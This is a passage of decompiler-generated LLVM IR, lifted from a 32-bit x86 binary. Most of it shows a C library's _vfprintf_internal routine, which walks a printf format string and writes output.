  %v1_804e71c = phi i32 [ 0, %dec_label_pc_804e704 ], [ %v5_804e714, %dec_label_pc_804e70a ]
  %v0_804e71c = load i32, i32* @ebp, align 4
  %v2_804e71c = add i32 %v0_804e71c, %v1_804e71c
  br label %dec_label_pc_804e71e

dec_label_pc_804e71e:                             ; preds = %dec_label_pc_804e6ec, %dec_label_pc_804e71c
  %v0_804e721 = phi i32 [ %v0_804e6f7, %dec_label_pc_804e6ec ], [ %v2_804e71c, %dec_label_pc_804e71c ]
  ret i32 %v0_804e721

; uselistorder directives
  uselistorder i32 %v0_804e70f, { 1, 0 }
  uselistorder i32 %v0_804e6f7, { 1, 2, 0 }
  uselistorder i32 %v1_804e6f0, { 1, 0 }
  uselistorder i32 %v2_804e6e4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e71e, { 1, 0 }
  uselistorder label %dec_label_pc_804e71c, { 1, 0 }
  uselistorder label %dec_label_pc_804e704, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e72b = load i32, i32* @ebx, align 4
  store i32 %v0_804e72b, i32* %stack_var_-16, align 4
  %v4_804e72b = ptrtoint i32* %stack_var_-16 to i32
  %v1_804e72c = add i32 %v4_804e72b, -356
  %v10_804e72c = icmp slt i32 %v1_804e72c, 0
  store i1 %v10_804e72c, i1* %sf.global-to-local, align 1
  %v4_804e732 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e732, i32* @ebx, align 4
  %v2_804e73a = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e73a, i32* @esi, align 4
  %v5_804e73f = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e732)
  store i32 %v5_804e73f, i32* %eax.global-to-local, align 4
  %v2_804e747 = icmp slt i32 %v5_804e73f, 0
  store i1 %v2_804e747, i1* %sf.global-to-local, align 1
  %v1_804e749 = icmp eq i1 %v2_804e747, false
  br i1 %v1_804e749, label %dec_label_pc_804e789, label %dec_label_pc_804e74b

dec_label_pc_804e74b:                             ; preds = %entry
  %v12_804e744 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804e74b = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e74b, i32* @ebx, align 4
  %v1_804e74f = add i32 %v12_804e744, -12
  %v10_804e74f = icmp slt i32 %v1_804e74f, 0
  store i1 %v10_804e74f, i1* %sf.global-to-local, align 1
  %v5_804e752 = inttoptr i32 %v3_804e74b to i8*
  %v3_804e753 = call i32 @strlen(i8* %v5_804e752)
  store i32 %v3_804e753, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804e762 = icmp eq i32 %v3_804e753, 0
  %v2_804e762 = icmp slt i32 %v3_804e753, 0
  store i1 %v2_804e762, i1* %sf.global-to-local, align 1
  br i1 %v1_804e762, label %dec_label_pc_804ecd2, label %dec_label_pc_804e76a

dec_label_pc_804e76a:                             ; preds = %dec_label_pc_804e74b
  %v0_804e76a = load i32, i32* @edx, align 4
  %v0_804e773 = load i32, i32* @ebx, align 4
  %v6_804e774 = call i32 @__stdio_fwrite(i32 %v0_804e773, i32 %v3_804e753, i32 %arg1, i32 %v0_804e76a)
  store i32 %v6_804e774, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804e781 = load i32, i32* @esp, align 4
  %v1_804e781 = add i32 %v0_804e781, 16
  %v7_804e781 = icmp slt i32 %v1_804e781, 0
  store i1 %v7_804e781, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ecd2

dec_label_pc_804e789:                             ; preds = %entry
  %v6_804e793 = call i32 @_ppfs_prepargs(i32 %v2_804e73a, i32 %arg3, i32 %v5_804e73f, i32 %v5_804e73f)
  store i32 %v6_804e793, i32* %eax.global-to-local, align 4
  %v0_804e798 = load i32, i32* @ebx, align 4
  store i32 %v0_804e798, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e7a2 = load i32, i32* @esp, align 4
  %v1_804e7a2 = add i32 %v0_804e7a2, 16
  %v7_804e7a2 = icmp slt i32 %v1_804e7a2, 0
  store i1 %v7_804e7a2, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e7a8

dec_label_pc_804e7a7:                             ; preds = %dec_label_pc_804e7ae
  %v1_804e7a7 = add i32 %v0_804e7b6, 1
  %v9_804e7a7 = icmp slt i32 %v1_804e7a7, 0
  store i1 %v9_804e7a7, i1* %sf.global-to-local, align 1
  store i32 %v1_804e7a7, i32* @ebx, align 4
  br label %dec_label_pc_804e7a8.backedge

dec_label_pc_804e7a8.backedge:                    ; preds = %dec_label_pc_804e7a7, %dec_label_pc_804ecb8, %dec_label_pc_804ecc3
  %v1_804e7b220 = phi i32 [ %v1_804e7ba, %dec_label_pc_804e7a7 ], [ %v3_804ecb8, %dec_label_pc_804ecb8 ], [ %v1_804e7e6, %dec_label_pc_804ecc3 ]
  %v0_804e7a818 = phi i32 [ %v1_804e7a7, %dec_label_pc_804e7a7 ], [ %v3_804ecb8, %dec_label_pc_804ecb8 ], [ %v1_804ecc3, %dec_label_pc_804ecc3 ]
  %v4_804e7a8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7a8

dec_label_pc_804e7a8:                             ; preds = %dec_label_pc_804e7a8.backedge, %dec_label_pc_804e789
  %v1_804e7ba = phi i32 [ %v1_804e7b220, %dec_label_pc_804e7a8.backedge ], [ %v0_804e798, %dec_label_pc_804e789 ]
  %v0_804e7b6 = phi i32 [ %v0_804e7a818, %dec_label_pc_804e7a8.backedge ], [ %v0_804e798, %dec_label_pc_804e789 ]
  %v4_804e7a8 = phi i32 [ %v4_804e7a8.pre, %dec_label_pc_804e7a8.backedge ], [ %v6_804e793, %dec_label_pc_804e789 ]
  %v1_804e7a8 = inttoptr i32 %v0_804e7b6 to i8*
  %v2_804e7a8 = load i8, i8* %v1_804e7a8, align 1
  %v3_804e7a8 = zext i8 %v2_804e7a8 to i32
  %v5_804e7a8 = and i32 %v4_804e7a8, -256
  %v6_804e7a8 = or i32 %v3_804e7a8, %v5_804e7a8
  store i32 %v6_804e7a8, i32* %eax.global-to-local, align 4
  %v4_804e7aa = icmp eq i8 %v2_804e7a8, 0
  %v5_804e7aa = icmp slt i8 %v2_804e7a8, 0
  store i1 %v5_804e7aa, i1* %sf.global-to-local, align 1
  br i1 %v4_804e7aa, label %dec_label_pc_804e7b2, label %dec_label_pc_804e7ae

dec_label_pc_804e7ae:                             ; preds = %dec_label_pc_804e7a8
  %v2_804e7ae = add i8 %v2_804e7a8, -37
  %v10_804e7ae = icmp eq i8 %v2_804e7ae, 0
  %v11_804e7ae = icmp slt i8 %v2_804e7ae, 0
  store i1 %v11_804e7ae, i1* %sf.global-to-local, align 1
  %v1_804e7b0 = icmp eq i1 %v10_804e7ae, false
  br i1 %v1_804e7b0, label %dec_label_pc_804e7a7, label %dec_label_pc_804e7b2

dec_label_pc_804e7b2:                             ; preds = %dec_label_pc_804e7ae, %dec_label_pc_804e7a8
  %v2_804e7b2 = sub i32 %v0_804e7b6, %v1_804e7ba
  %v12_804e7b2 = icmp eq i32 %v2_804e7b2, 0
  %v13_804e7b2 = icmp slt i32 %v2_804e7b2, 0
  store i1 %v13_804e7b2, i1* %sf.global-to-local, align 1
  br i1 %v12_804e7b2, label %dec_label_pc_804e7dd, label %dec_label_pc_804e7b6

dec_label_pc_804e7b6:                             ; preds = %dec_label_pc_804e7b2
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e7b2, i32* @esi, align 4
  store i1 %v13_804e7b2, i1* %sf.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_804e7b2, 1
  br i1 %tmp65, label %dec_label_pc_804e7d2, label %dec_label_pc_804e7c0

dec_label_pc_804e7c0:                             ; preds = %dec_label_pc_804e7b6
  %v0_804e7c0 = load i32, i32* @ebp, align 4
  %v1_804e7c0 = load i32, i32* @esp, align 4
  %v2_804e7c0 = add i32 %v1_804e7c0, -4
  %v3_804e7c0 = inttoptr i32 %v2_804e7c0 to i32*
  store i32 %v0_804e7c0, i32* %v3_804e7c0, align 4
  %v1_804e7c1 = add i32 %v1_804e7c0, 368
  %v2_804e7c1 = inttoptr i32 %v1_804e7c1 to i32*
  %v3_804e7c1 = load i32, i32* %v2_804e7c1, align 4
  %v5_804e7c1 = add i32 %v1_804e7c0, -8
  %v6_804e7c1 = inttoptr i32 %v5_804e7c1 to i32*
  store i32 %v3_804e7c1, i32* %v6_804e7c1, align 4
  %v0_804e7c8 = load i32, i32* @esi, align 4
  %v2_804e7c8 = add i32 %v1_804e7c0, -12
  %v3_804e7c8 = inttoptr i32 %v2_804e7c8 to i32*
  store i32 %v0_804e7c8, i32* %v3_804e7c8, align 4
  %v0_804e7c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e7c9 = add i32 %v1_804e7c0, -16
  %v3_804e7c9 = inttoptr i32 %v2_804e7c9 to i32*
  store i32 %v0_804e7c9, i32* %v3_804e7c9, align 4
  %v0_804e7ca = load i32, i32* %stack_var_-364, align 4
  %v4_804e7ca = call i32 @__stdio_fwrite(i32 %v0_804e7ca, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e7ca, i32* %eax.global-to-local, align 4
  %v0_804e7cf = load i32, i32* @esp, align 4
  %v1_804e7cf = add i32 %v0_804e7cf, 16
  %v7_804e7cf = icmp slt i32 %v1_804e7cf, 0
  store i1 %v7_804e7cf, i1* %sf.global-to-local, align 1
  %v1_804e7d2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e7d2

dec_label_pc_804e7d2:                             ; preds = %dec_label_pc_804e7b6, %dec_label_pc_804e7c0
  %v3_804e7da = phi i32 [ %v2_804e7b2, %dec_label_pc_804e7b6 ], [ %v1_804e7d2.pre, %dec_label_pc_804e7c0 ]
  %v0_804e7d2 = phi i32 [ 0, %dec_label_pc_804e7b6 ], [ %v4_804e7ca, %dec_label_pc_804e7c0 ]
  %v2_804e7d2 = sub i32 %v0_804e7d2, %v3_804e7da
  %v12_804e7d2 = icmp eq i32 %v2_804e7d2, 0
  %v13_804e7d2 = icmp slt i32 %v2_804e7d2, 0
  store i1 %v13_804e7d2, i1* %sf.global-to-local, align 1
  %v1_804e7d4 = icmp eq i1 %v12_804e7d2, false
  %v0_804eccb.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e7d4, label %dec_label_pc_804eccb, label %dec_label_pc_804e7da

dec_label_pc_804e7da:                             ; preds = %dec_label_pc_804e7d2
  %v1_804e7da = inttoptr i32 %v0_804eccb.pre.pre to i32*
  %v2_804e7da = load i32, i32* %v1_804e7da, align 4
  %v4_804e7da = add i32 %v2_804e7da, %v3_804e7da
  %v15_804e7da = icmp slt i32 %v4_804e7da, 0
  store i1 %v15_804e7da, i1* %sf.global-to-local, align 1
  store i32 %v4_804e7da, i32* %v1_804e7da, align 4
  %v0_804e7dd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e7dd

dec_label_pc_804e7dd:                             ; preds = %dec_label_pc_804e7b2, %dec_label_pc_804e7da
  %v0_804ecc3 = phi i32 [ %v0_804e7b6, %dec_label_pc_804e7b2 ], [ %v0_804e7dd.pre, %dec_label_pc_804e7da ]
  %v1_804e7dd = inttoptr i32 %v0_804ecc3 to i8*
  %v2_804e7dd = load i8, i8* %v1_804e7dd, align 1
  %v3_804e7dd = icmp eq i8 %v2_804e7dd, 0
  %v4_804e7dd = icmp slt i8 %v2_804e7dd, 0
  store i1 %v4_804e7dd, i1* %sf.global-to-local, align 1
  br i1 %v3_804e7dd, label %dec_label_pc_804ecd2, label %dec_label_pc_804e7e6

dec_label_pc_804e7e6:                             ; preds = %dec_label_pc_804e7dd
  %v1_804e7e6 = add i32 %v0_804ecc3, 1
  %v2_804e7e6 = inttoptr i32 %v1_804e7e6 to i8*
  %v3_804e7e6 = load i8, i8* %v2_804e7e6, align 1
  %v4_804e7e6 = add i8 %v3_804e7e6, -37
  %v12_804e7e6 = icmp eq i8 %v4_804e7e6, 0
  %v13_804e7e6 = icmp slt i8 %v4_804e7e6, 0
  store i1 %v13_804e7e6, i1* %sf.global-to-local, align 1
  store i32 %v1_804e7e6, i32* %edx.global-to-local, align 4
  br i1 %v12_804e7e6, label %dec_label_pc_804ecc3, label %dec_label_pc_804e7f3

dec_label_pc_804e7f3:                             ; preds = %dec_label_pc_804e7e6
  %v1_804e7f3 = load i32, i32* @esp, align 4
  %v2_804e7f3 = add i32 %v1_804e7f3, 16
  %v3_804e7f3 = inttoptr i32 %v2_804e7f3 to i32*
  store i32 %v1_804e7e6, i32* %v3_804e7f3, align 4
  %v0_804e7f7 = load i32, i32* @esp, align 4
  %v1_804e7f7 = add i32 %v0_804e7f7, 340
  %v2_804e7f7 = inttoptr i32 %v1_804e7f7 to i32*
  store i32 0, i32* %v2_804e7f7, align 4
  %v0_804e802 = load i32, i32* @esp, align 4
  %v1_804e802 = add i32 %v0_804e802, -12
  %v10_804e802 = icmp slt i32 %v1_804e802, 0
  store i1 %v10_804e802, i1* %sf.global-to-local, align 1
  %v1_804e805 = add i32 %v0_804e802, 16
  store i32 %v1_804e805, i32* @ebx, align 4
  %v2_804e809 = add i32 %v0_804e802, -16
  %v3_804e809 = inttoptr i32 %v2_804e809 to i32*
  store i32 %v1_804e805, i32* %v3_804e809, align 4
  %v0_804e80a = load i32, i32* %stack_var_-364, align 4
  %v1_804e80a = inttoptr i32 %v0_804e80a to i32*
  %v2_804e80a = call i32 @_ppfs_parsespec(i32* %v1_804e80a)
  store i32 %v2_804e80a, i32* %eax.global-to-local, align 4
  %v0_804e80f = load i32, i32* @ebx, align 4
  %v1_804e80f = load i32, i32* @esp, align 4
  %v2_804e80f = inttoptr i32 %v1_804e80f to i32*
  store i32 %v0_804e80f, i32* %v2_804e80f, align 4
  %v0_804e812 = load i32, i32* %stack_var_-364, align 4
  %v1_804e812 = call i32 @_ppfs_setargs(i32 %v0_804e812)
  store i32 %v1_804e812, i32* %eax.global-to-local, align 4
  %v0_804e817 = load i32, i32* @esp, align 4
  %v1_804e817 = add i32 %v0_804e817, 70
  %v2_804e817 = inttoptr i32 %v1_804e817 to i8*
  %v3_804e817 = load i8, i8* %v2_804e817, align 1
  %v4_804e817 = zext i8 %v3_804e817 to i32
  store i32 %v4_804e817, i32* @edi, align 4
  %v1_804e81c = add i32 %v0_804e817, 16
  %v1_804e81f = add i32 %v0_804e817, 56
  %v2_804e81f = inttoptr i32 %v1_804e81f to i32*
  %v3_804e81f = load i32, i32* %v2_804e81f, align 4
  %v5_804e81f = icmp slt i32 %v3_804e81f, 0
  store i1 %v5_804e81f, i1* %sf.global-to-local, align 1
  %v1_804e824 = add i32 %v0_804e817, 112
  store i32 %v1_804e824, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_804e81f, 1
  br i1 %tmp66, label %dec_label_pc_804e831, label %dec_label_pc_804e82a

dec_label_pc_804e82a:                             ; preds = %dec_label_pc_804e7f3
  %v2_804e82a = zext i8 %v3_804e817 to i32
  %v3_804e82a = mul nuw nsw i32 %v2_804e82a, 12
  store i32 %v3_804e82a, i32* %eax.global-to-local, align 4
  %v2_804e82d = add i32 %v0_804e817, 100
  %v3_804e82d = add i32 %v2_804e82d, %v3_804e82a
  store i32 %v3_804e82d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e831

dec_label_pc_804e831:                             ; preds = %dec_label_pc_804e7f3, %dec_label_pc_804e82a
  %v0_804e83927 = phi i32 [ %v1_804e824, %dec_label_pc_804e7f3 ], [ %v3_804e82d, %dec_label_pc_804e82a ]
  %v1_804e831 = add i32 %v0_804e817, 60
  %v2_804e831 = inttoptr i32 %v1_804e831 to i32*
  %v3_804e831 = load i32, i32* %v2_804e831, align 4
  store i32 %v3_804e831, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e84472 = sub i32 0, %v3_804e831
  %v10_804e84475 = and i32 %v3_804e831, %v2_804e84472
  %v11_804e84476 = icmp slt i32 %v10_804e84475, 0
  %v13_804e84477 = icmp slt i32 %v2_804e84472, 0
  %v2_804e84678 = icmp eq i1 %v13_804e84477, %v11_804e84476
  br i1 %v2_804e84678, label %dec_label_pc_804e848, label %dec_label_pc_804e839

dec_label_pc_804e839:                             ; preds = %dec_label_pc_804e831, %dec_label_pc_804e839
  %v0_804e84882 = phi i32 [ %v0_804e848, %dec_label_pc_804e839 ], [ %v1_804e81c, %dec_label_pc_804e831 ]
  %v2_804e83981 = phi i32 [ %v1_804e843, %dec_label_pc_804e839 ], [ 0, %dec_label_pc_804e831 ]
  %v0_804e83980 = phi i32 [ %v1_804e840, %dec_label_pc_804e839 ], [ %v0_804e83927, %dec_label_pc_804e831 ]
  %v3_804e839 = mul i32 %v2_804e83981, 4
  %v4_804e839 = add i32 %v3_804e839, 344
  %v5_804e839 = add i32 %v4_804e839, %v0_804e84882
  %v6_804e839 = inttoptr i32 %v5_804e839 to i32*
  store i32 %v0_804e83980, i32* %v6_804e839, align 4
  %v0_804e840 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e840 = add i32 %v0_804e840, 12
  store i32 %v1_804e840, i32* %edx.global-to-local, align 4
  %v0_804e843 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e843 = add i32 %v0_804e843, 1
  %v1_804e844.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e843, i32* %eax.global-to-local, align 4
  %v2_804e844 = sub i32 %v1_804e843, %v1_804e844.pre
  %v8_804e844 = xor i32 %v1_804e843, %v1_804e844.pre
  %v9_804e844 = xor i32 %v2_804e844, %v1_804e843
  %v10_804e844 = and i32 %v9_804e844, %v8_804e844
  %v11_804e844 = icmp slt i32 %v10_804e844, 0
  %v13_804e844 = icmp slt i32 %v2_804e844, 0
  %v2_804e846 = icmp eq i1 %v13_804e844, %v11_804e844
  %v0_804e848 = load i32, i32* @esp, align 4
  br i1 %v2_804e846, label %dec_label_pc_804e848, label %dec_label_pc_804e839

dec_label_pc_804e848:                             ; preds = %dec_label_pc_804e839, %dec_label_pc_804e831
  %v0_804e848.lcssa = phi i32 [ %v1_804e81c, %dec_label_pc_804e831 ], [ %v0_804e848, %dec_label_pc_804e839 ]
  %v1_804e848 = add i32 %v0_804e848.lcssa, 48
  %v2_804e848 = inttoptr i32 %v1_804e848 to i32*
  %v3_804e848 = load i32, i32* %v2_804e848, align 4
  store i32 %v3_804e848, i32* @ecx, align 4
  %v1_804e84c = icmp eq i32 %v3_804e848, 0
  %v2_804e84c = icmp slt i32 %v3_804e848, 0
  store i1 %v2_804e84c, i1* %sf.global-to-local, align 1
  %v1_804e84e = icmp eq i1 %v1_804e84c, false
  br i1 %v1_804e84e, label %dec_label_pc_804e876, label %dec_label_pc_804e850

dec_label_pc_804e850:                             ; preds = %dec_label_pc_804e848
  %v1_804e850 = inttoptr i32 %v0_804e848.lcssa to i32*
  %v2_804e850 = load i32, i32* %v1_804e850, align 4
  store i32 %v2_804e850, i32* %eax.global-to-local, align 4
  %v1_804e853 = ashr i32 %v2_804e850, 31
  store i32 %v1_804e853, i32* %edx.global-to-local, align 4
  %v2_804e854 = add i32 %v0_804e848.lcssa, -4
  %v3_804e854 = inttoptr i32 %v2_804e854 to i32*
  store i32 %v1_804e853, i32* %v3_804e854, align 4
  %v0_804e855 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e855 = add i32 %v0_804e848.lcssa, -8
  %v3_804e855 = inttoptr i32 %v2_804e855 to i32*
  store i32 %v0_804e855, i32* %v3_804e855, align 4
  %v1_804e856 = add i32 %v0_804e848.lcssa, 32
  %v2_804e856 = inttoptr i32 %v1_804e856 to i32*
  %v3_804e856 = load i32, i32* %v2_804e856, align 4
  %v1_804e85a = and i32 %v3_804e856, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e85a, i32* %eax.global-to-local, align 4
  %v2_804e85f = add i32 %v0_804e848.lcssa, -12
  %v3_804e85f = inttoptr i32 %v2_804e85f to i32*
  store i32 %v1_804e85a, i32* %v3_804e85f, align 4
  %v1_804e860 = add i32 %v0_804e848.lcssa, 344
  %v2_804e860 = inttoptr i32 %v1_804e860 to i32*
  %v3_804e860 = load i32, i32* %v2_804e860, align 4
  store i32 %v3_804e860, i32* %eax.global-to-local, align 4
  %v1_804e867 = inttoptr i32 %v3_804e860 to i32*
  %v2_804e867 = load i32, i32* %v1_804e867, align 4
  %v4_804e867 = add i32 %v0_804e848.lcssa, -16
  %v5_804e867 = inttoptr i32 %v4_804e867 to i32*
  store i32 %v2_804e867, i32* %v5_804e867, align 4
  %v0_804e869 = call i32 @_store_inttype()
  store i32 %v0_804e869, i32* %eax.global-to-local, align 4
  %v0_804e86e = load i32, i32* @esp, align 4
  %v1_804e86e = add i32 %v0_804e86e, 16
  %v7_804e86e = icmp slt i32 %v1_804e86e, 0
  store i1 %v7_804e86e, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ecb8

dec_label_pc_804e876:                             ; preds = %dec_label_pc_804e848
  %v1_804e876 = add i32 %v3_804e848, -7
  %v5_804e876 = icmp ult i32 %v3_804e848, 7
  %v9_804e876 = icmp eq i32 %v1_804e876, 0
  %v10_804e876 = icmp slt i32 %v1_804e876, 0
  store i1 %v10_804e876, i1* %sf.global-to-local, align 1
  %v2_804e879 = or i1 %v5_804e876, %v9_804e876
  br i1 %v2_804e879, label %dec_label_pc_804e87f, label %dec_label_pc_804e9e3

dec_label_pc_804e87f:                             ; preds = %dec_label_pc_804e876
  %v1_804e87f = add i32 %v3_804e848, 134574928
  %v2_804e87f = inttoptr i32 %v1_804e87f to i8*
  %v3_804e87f = load i8, i8* %v2_804e87f, align 1
  %v4_804e87f = sext i8 %v3_804e87f to i32
  store i32 %v4_804e87f, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e88b = icmp eq i8 %v3_804e87f, 10
  %v10_804e88b = icmp slt i8 %v3_804e87f, 10
  store i1 %v10_804e88b, i1* %sf.global-to-local, align 1
  %v1_804e88e = icmp eq i1 %v9_804e88b, false
  br i1 %v1_804e88e, label %dec_label_pc_804e8ae, label %dec_label_pc_804e890

dec_label_pc_804e890:                             ; preds = %dec_label_pc_804e87f
  %v1_804e890 = add i32 %v0_804e848.lcssa, 32
  %v2_804e890 = inttoptr i32 %v1_804e890 to i32*
  %v3_804e890 = load i32, i32* %v2_804e890, align 4
  store i32 %v3_804e890, i32* %eax.global-to-local, align 4
  %v1_804e896 = udiv i32 %v3_804e890, 32
  %tmp67 = urem i32 %v1_804e896, 2
  %tmp68 = sub nsw i32 45, %tmp67
  %v2_804e8a6 = or i32 %tmp68, 128
  store i32 %v2_804e8a6, i32* %edx.global-to-local, align 4
  %v2_804e8a9 = and i32 %v3_804e890, 64
  %v3_804e8a9 = icmp eq i32 %v2_804e8a9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e8ab = icmp eq i1 %v3_804e8a9, false
  %v4_804e8ab = select i1 %v1_804e8ab, i32 %v2_804e8a6, i32 %tmp68
  store i32 %v4_804e8ab, i32* @ebx, align 4
  br label %dec_label_pc_804e8ae

dec_label_pc_804e8ae:                             ; preds = %dec_label_pc_804e87f, %dec_label_pc_804e890
  %v1_804e8ae = add i32 %v3_804e848, -5
  %v5_804e8ae = icmp ult i32 %v3_804e848, 5
  %v9_804e8ae = icmp eq i32 %v1_804e8ae, 0
  %v10_804e8ae = icmp slt i32 %v1_804e8ae, 0
  store i1 %v10_804e8ae, i1* %sf.global-to-local, align 1
  %v2_804e8b1 = or i1 %v5_804e8ae, %v9_804e8ae
  br i1 %v2_804e8b1, label %dec_label_pc_804e8b3, label %dec_label_pc_804e8cb

dec_label_pc_804e8b3:                             ; preds = %dec_label_pc_804e8ae
  %v1_804e8b3 = add i32 %v3_804e848, -3
  %v9_804e8b3 = icmp eq i32 %v1_804e8b3, 0
  %v10_804e8b3 = icmp slt i32 %v1_804e8b3, 0
  store i1 %v10_804e8b3, i1* %sf.global-to-local, align 1
  %v1_804e8b6 = icmp eq i1 %v9_804e8b3, false
  br i1 %v1_804e8b6, label %dec_label_pc_804e8bf, label %dec_label_pc_804e8b8

dec_label_pc_804e8b8:                             ; preds = %dec_label_pc_804e8b3
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e8cd

dec_label_pc_804e8bf:                             ; preds = %dec_label_pc_804e8b3
  %v1_804e8bf = add i32 %v3_804e848, -1
  %v9_804e8bf = icmp eq i32 %v1_804e8bf, 0
  %v10_804e8bf = icmp slt i32 %v1_804e8bf, 0
  store i1 %v10_804e8bf, i1* %sf.global-to-local, align 1
  br i1 %v9_804e8bf, label %dec_label_pc_804e8d2, label %dec_label_pc_804e8cd

dec_label_pc_804e8cb:                             ; preds = %dec_label_pc_804e8ae
  %v1_804e8cb = sub nsw i32 0, %v4_804e87f
  %v7_804e8cb = icmp sgt i8 %v3_804e87f, 0
  store i1 %v7_804e8cb, i1* %sf.global-to-local, align 1
  store i32 %v1_804e8cb, i32* @esi, align 4
  br label %dec_label_pc_804e8cd

dec_label_pc_804e8cd:                             ; preds = %dec_label_pc_804e8bf, %dec_label_pc_804e8b8, %dec_label_pc_804e8cb
  br label %dec_label_pc_804e8d2

dec_label_pc_804e8d2:                             ; preds = %dec_label_pc_804e8bf, %dec_label_pc_804e8cd
  %storemerge = phi i32 [ 11, %dec_label_pc_804e8cd ], [ 6, %dec_label_pc_804e8bf ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804e8d2 = add i32 %v0_804e848.lcssa, 20
  %v2_804e8d2 = inttoptr i32 %v1_804e8d2 to i32*
  %v3_804e8d2 = load i32, i32* %v2_804e8d2, align 4
  %v5_804e8d2 = icmp slt i32 %v3_804e8d2, 0
  store i1 %v5_804e8d2, i1* %sf.global-to-local, align 1
  %v1_804e8d7 = add i32 %v0_804e848.lcssa, 7
  %v2_804e8d7 = inttoptr i32 %v1_804e8d7 to i8*
  store i8 32, i8* %v2_804e8d7, align 1
  %v0_804e8dc = load i1, i1* %sf.global-to-local, align 1
  %v1_804e8dc = icmp eq i1 %v0_804e8dc, false
  br i1 %v1_804e8dc, label %dec_label_pc_804e8e6, label %dec_label_pc_804e8de

dec_label_pc_804e8de:                             ; preds = %dec_label_pc_804e8d2
  %v0_804e8de = load i32, i32* @esp, align 4
  %v1_804e8de = add i32 %v0_804e8de, 36
  %v2_804e8de = inttoptr i32 %v1_804e8de to i8*
  %v3_804e8de = load i8, i8* %v2_804e8de, align 1
  %v4_804e8de = zext i8 %v3_804e8de to i32
  %v5_804e8de = load i32, i32* %edx.global-to-local, align 4
  %v6_804e8de = and i32 %v5_804e8de, -256
  %v7_804e8de = or i32 %v6_804e8de, %v4_804e8de
  store i32 %v7_804e8de, i32* %edx.global-to-local, align 4
  %v3_804e8e2 = add i32 %v0_804e8de, 7
  %v4_804e8e2 = inttoptr i32 %v3_804e8e2 to i8*
  store i8 %v3_804e8de, i8* %v4_804e8e2, align 1
  br label %dec_label_pc_804e8e6

dec_label_pc_804e8e6:                             ; preds = %dec_label_pc_804e8d2, %dec_label_pc_804e8de
  %v1_804e8e6 = add i32 %v3_804e848, -1
  %v8_804e8e6 = icmp eq i32 %v1_804e8e6, 0
  %v9_804e8e6 = icmp slt i32 %v1_804e8e6, 0
  store i1 %v9_804e8e6, i1* %sf.global-to-local, align 1
  store i32 %v1_804e8e6, i32* %ecx.global-to-local, align 4
  %v0_804e8e7 = load i32, i32* @esp, align 4
  %v1_804e8e7 = add i32 %v0_804e8e7, 344
  %v2_804e8e7 = inttoptr i32 %v1_804e8e7 to i32*
  %v3_804e8e7 = load i32, i32* %v2_804e8e7, align 4
  store i32 %v3_804e8e7, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804e8ff.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e8e6, label %dec_label_pc_804e8ff, label %dec_label_pc_804e8f5

dec_label_pc_804e8f5:                             ; preds = %dec_label_pc_804e8e6
  %v2_804e8f5 = mul i32 %v0_804e8ff.pre, 4
  %v3_804e8f5 = add i32 %v0_804e8e7, 52
  %v4_804e8f5 = add i32 %v3_804e8f5, %v2_804e8f5
  %v5_804e8f5 = inttoptr i32 %v4_804e8f5 to i32*
  %v6_804e8f5 = load i32, i32* %v5_804e8f5, align 4
  %v1_804e8f9 = and i32 %v6_804e8f5, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e8f9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8ff

dec_label_pc_804e8ff:                             ; preds = %dec_label_pc_804e8e6, %dec_label_pc_804e8f5
  %v2_804e8ff = add i32 %v0_804e8e7, -4
  %v3_804e8ff = inttoptr i32 %v2_804e8ff to i32*
  store i32 %v0_804e8ff.pre, i32* %v3_804e8ff, align 4
  %v0_804e900 = load i32, i32* @esi, align 4
  %v2_804e900 = add i32 %v0_804e8e7, -8
  %v3_804e900 = inttoptr i32 %v2_804e900 to i32*
  store i32 %v0_804e900, i32* %v3_804e900, align 4
